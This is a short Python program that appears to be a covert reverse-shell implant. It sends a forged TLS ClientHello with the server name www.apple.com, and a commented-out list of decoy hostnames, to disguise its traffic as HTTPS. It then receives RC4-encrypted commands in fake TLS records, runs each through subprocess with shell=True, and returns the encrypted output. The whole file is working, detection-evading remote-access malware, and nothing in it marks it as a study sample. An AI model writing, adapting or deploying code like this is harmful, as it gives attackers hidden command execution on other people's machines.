import socket
import random
import struct
import shlex
import subprocess
from Crypto.Cipher import ARC4

SECRET = b"\xf1n\xcd\xc6yLf\xd1\x02\xf83\xc4\x86\xe7\xa45\x8di\xbd\xd2\x1dP\xf5\xfb\xdf\xec\xaf\x0b\x9eS\xa4\xd3"

def generate_data(s):
    rc4 = ARC4.new(SECRET)
    encrypted = rc4.encrypt(s.encode())
    return b"\x17\x03\x03" + struct.pack(">h", len(encrypted)) + encrypted

def generate_client_hello():
    start = b"\x03\x03\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\x00\x08\x13\x02\x13\x03\x13\x01\x00\xff\x01\x00"
    extensions = b"\x00\x0b\x00\x04\x03\x00\x01\x02\x00\x0a\x00\x16\x00\x14\x00\x1d\x00\x17\x00\x1e\x00\x19\x00\x18\x01\x00\x01\x01\x01\x02\x01\x03\x01\x04\x00\x23\x00\x00\x00\x16\x00\x00\x00\x17\x00\x00\x00\x0d\x00\x1e\x00\x1c\x04\x03\x05\x03\x06\x03\x08\x07\x08\x08\x08\x09\x08\x0a\x08\x0b\x08\x04\x08\x05\x08\x06\x04\x01\x05\x01\x06\x01\x00\x2b\x00\x03\x02\x03\x04\x00\x2d\x00\x02\x01\x01\x00\x33\x00\x26\x00\x24\x00\x1d\x00\x20\x35\x80\x72\xd6\x36\x58\x80\xd1\xae\xea\x32\x9a\xdf\x91\x21\x38\x38\x51\xed\x21\xa2\x8e\x3b\x75\xe9\x65\xd0\xd2\xcd\x16\x62\x54"

    # hostname = random.choice(["www.microsoft.com", "www.wikipedia.com", "www.paypal.com", "www.bing.com", "www.wordpress.com", "www.apple.com"])
    hostname = "www.apple.com"

    dns_hostname = b"\x00" + struct.pack(">h", len(hostname)) + hostname.encode()
    entry = struct.pack(">h", len(dns_hostname)) + dns_hostname
    server_name = struct.pack(">h", len(entry)) + entry
    extensions = b"\x00\x00" + server_name + extensions
    client_hello = start + struct.pack(">h", len(extensions)) + extensions
    handshake = b"\x01" + struct.pack(">i", len(client_hello))[1:] + client_hello

    payload = b"\x16\x03\x01" + struct.pack(">h", len(handshake)) + handshake
    return payload

def start_tls(s):
    s.sendall(generate_client_hello())
    s.recv(2048)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(("127.0.0.1", 443))
    start_tls(s)

    while True:
        rc4 = ARC4.new(SECRET)
        data = s.recv(2048)
        if not data:
            break
        cmd = rc4.decrypt(data[5:])
        print(cmd)
        cmd = cmd.decode()
        if cmd == "exit":
            break
        try:
            output = subprocess.check_output(shlex.split(cmd), shell=True, stderr=subprocess.STDOUT)
        except:
            output = b"Error"
        s.sendall(generate_data(output.decode()))
